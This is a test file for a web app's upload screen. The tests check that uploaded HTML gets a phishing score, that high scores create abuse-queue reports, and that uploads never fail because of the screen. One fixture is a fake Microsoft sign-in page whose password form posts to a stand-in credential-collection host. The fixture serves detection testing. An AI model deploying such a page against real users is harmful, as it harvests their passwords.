// The upload screen, on the path that every stored document actually takes.
//
// There are three ways customer HTML reaches R2 and all three end in
// createDocumentForUser: the dashboard form (app/(app)/new/actions.ts), the
// tool pages, which submit that same server action with the file they staged
// in IndexedDB (app/tools/HtmlToolPanel.tsx), and POST /api/v1/shares, which
// calls it directly with the service role. So the screen is wired in once,
// here, and these tests exercise the three callers' shapes through it rather
// than three near-identical copies of the same assertion.
//
// The two things that must hold on every path: the score is written on the
// document row, and a score at or above the threshold puts a row in the abuse
// queue. Neither may ever stop the upload.

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { SupabaseClient } from '@supabase/supabase-js';

vi.mock('./r2', () => ({
  r2Key: (userId: string, docId: string, v: number) => `docs/${userId}/${docId}/v${v}.html`,
  uploadHtml: vi.fn(async () => undefined),
}));
vi.mock('./events', () => ({ captureServerEvent: vi.fn(async () => undefined) }));

import { createDocumentForUser } from './create-document';
import { SCREEN_FLAG_THRESHOLD } from './screen-html';

const USER = '00000000-0000-4000-8000-000000000001';

const PHISHING = `<html><head><title>Sign in to Microsoft</title></head><body>
  <h1>Sign in</h1><p>Your Office 365 session has expired.</p>
  <form action="https://collect.example-bad.tk/p.php" method="post">
    <input type="password" name="passwd">
  </form></body></html>`;

const BENIGN = `<html><head><title>Q3 update</title></head><body>
  <h1>Q3 update</h1><p>Mail us at <a href="mailto:hi@acme.com">hi@acme.com</a>.</p>
  </body></html>`;

interface Insert {
  table: string;
  row: Record<string, unknown>;
}

// `rejectScreenColumns` reproduces a database that has not had schema/039
// applied: PostgREST refuses an insert naming a column it cannot find.
function fakeSupabase(inserts: Insert[], rejectScreenColumns = false) {
  return {
    from(table: string) {
      return {
        insert: async (row: Record<string, unknown>) => {
          if (rejectScreenColumns && 'screen_score' in row) {
            return {
              error: {
                message:
                  "Could not find the 'screen_score' column of 'documents' in the schema cache",
              },
            };
          }
          inserts.push({ table, row });
          return { error: null };
        },
        delete: () => ({ eq: async () => ({ error: null }) }),
      };
    },
  } as unknown as SupabaseClient;
}

function bytes(html: string): Uint8Array {
  return new TextEncoder().encode(html);
}

let inserts: Insert[];
let fetchMock: ReturnType<typeof vi.fn>;

beforeEach(() => {
  inserts = [];
  process.env['SUPABASE_URL'] = 'https://project.supabase.co';
  process.env['SUPABASE_SERVICE_ROLE_KEY'] = 'service-role-key';
  fetchMock = vi.fn();
  fetchMock.mockResolvedValue({ ok: true, status: 201 });
  vi.stubGlobal('fetch', fetchMock);
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

function documentRow(): Record<string, unknown> {
  const row = inserts.find((i) => i.table === 'documents')?.row;
  if (!row) throw new Error('no documents insert');
  return row;
}

function abuseInserts() {
  return fetchMock.mock.calls.filter(([url]) => String(url).endsWith('/rest/v1/abuse_reports'));
}

describe('createDocumentForUser — the score on the document row', () => {
  it('stores a zero score and no signals for the dashboard upload of an ordinary deck', async () => {
    // The dashboard passes a cookie-scoped client; the row is written under
    // the owner's own RLS policy, columns and all.
    await createDocumentForUser(fakeSupabase(inserts), USER, 'Q3 update', {
      type: 'upload',
      bytes: bytes(BENIGN),
      filename: 'q3.html',
    });
    expect(documentRow()).toMatchObject({ screen_score: 0, screen_signals: [] });
    expect(abuseInserts()).toEqual([]);
  });

  it('stores the score and the named signals for a tool-page upload that looks like a kit', async () => {
    // The tool pages submit the staged file through the same server action, so
    // what arrives here is a filename and bytes exactly as above.
    await createDocumentForUser(fakeSupabase(inserts), USER, 'login', {
      type: 'upload',
      bytes: bytes(PHISHING),
      filename: 'login.html',
    });
    const row = documentRow();
    expect(row['screen_score']).toBeGreaterThanOrEqual(SCREEN_FLAG_THRESHOLD);
    expect(row['screen_signals']).toContain('password-input');
    expect(row['screen_signals']).toContain('brand-login-wording');
  });

  it('still stores the document when the database has not had schema/039 applied', async () => {
    // A push deploys itself; the migration is a human pasting SQL afterwards.
    // In that window the upload must go through without the score, not fail.
    const docId = await createDocumentForUser(fakeSupabase(inserts, true), USER, 'Q3 update', {
      type: 'upload',
      bytes: bytes(BENIGN),
      filename: 'q3.html',
    });
    expect(docId).toMatch(/^[0-9a-f-]{36}$/);
    const row = documentRow();
    expect(row).not.toHaveProperty('screen_score');
    expect(row['r2_key']).toBe(`docs/${USER}/${docId}/v1.html`);
  });

  it('leaves a URL-source document unscreened rather than scoring it clean', async () => {
    await createDocumentForUser(fakeSupabase(inserts), USER, 'Live page', {
      type: 'url',
      url: 'https://acme.com/deck',
    });
    const row = documentRow();
    expect(row).not.toHaveProperty('screen_score');
    expect(row).not.toHaveProperty('screen_signals');
    expect(abuseInserts()).toEqual([]);
  });
});

describe('createDocumentForUser — the abuse queue', () => {
  it('writes an abuse_reports row for the API path when the score reaches the threshold', async () => {
    // POST /api/v1/shares passes the service-role client; the flag write uses
    // the service role regardless, because abuse_reports is closed to every
    // customer-facing role.
    const docId = await createDocumentForUser(fakeSupabase(inserts), USER, 'login', {
      type: 'upload',
      bytes: bytes(PHISHING),
      filename: null,
    });

    const calls = abuseInserts();
    expect(calls).toHaveLength(1);
    const [url, init] = calls[0] as unknown as [string, RequestInit];
    expect(url).toBe('https://project.supabase.co/rest/v1/abuse_reports');
    expect(init.method).toBe('POST');
    expect((init.headers as Record<string, string>)['Authorization']).toBe(
      'Bearer service-role-key',
    );

    const body = JSON.parse(String(init.body)) as Record<string, string>;
    expect(body['document_id']).toBe(docId);
    // 'phishing' is already an allowed value of the CHECK constraint on
    // abuse_reports.reason — it is what the recipient's own form calls
    // "phishing or impersonation" — so an automated flag needs no new one.
    expect(body['reason']).toBe('phishing');
    expect(body['note']).toContain('automated upload screen');
    expect(body['note']).toContain('password-input');
    expect(String(body['note']).length).toBeLessThanOrEqual(500);
  });

  it('writes nothing to the queue below the threshold', async () => {
    // A password box on its own: a product mockup, not a phishing page.
    await createDocumentForUser(fakeSupabase(inserts), USER, 'Mockup', {
      type: 'upload',
      bytes: bytes('<form><input type="password"></form>'),
      filename: 'mockup.html',
    });
    expect(documentRow()['screen_score']).toBeLessThan(SCREEN_FLAG_THRESHOLD);
    expect(abuseInserts()).toEqual([]);
  });

  it('still returns the document when the queue write fails', async () => {
    // The screen informs an operator. It does not gate the product, and a
    // customer must never lose an upload because a queue insert 500'd.
    fetchMock.mockRejectedValue(new Error('connection lost'));
    const docId = await createDocumentForUser(fakeSupabase(inserts), USER, 'login', {
      type: 'upload',
      bytes: bytes(PHISHING),
      filename: null,
    });
    expect(docId).toMatch(/^[0-9a-f-]{36}$/);
  });

  it('still returns the document when the service role is not configured', async () => {
    delete process.env['SUPABASE_SERVICE_ROLE_KEY'];
    const docId = await createDocumentForUser(fakeSupabase(inserts), USER, 'login', {
      type: 'upload',
      bytes: bytes(PHISHING),
      filename: null,
    });
    expect(docId).toMatch(/^[0-9a-f-]{36}$/);
    expect(abuseInserts()).toEqual([]);
  });
});
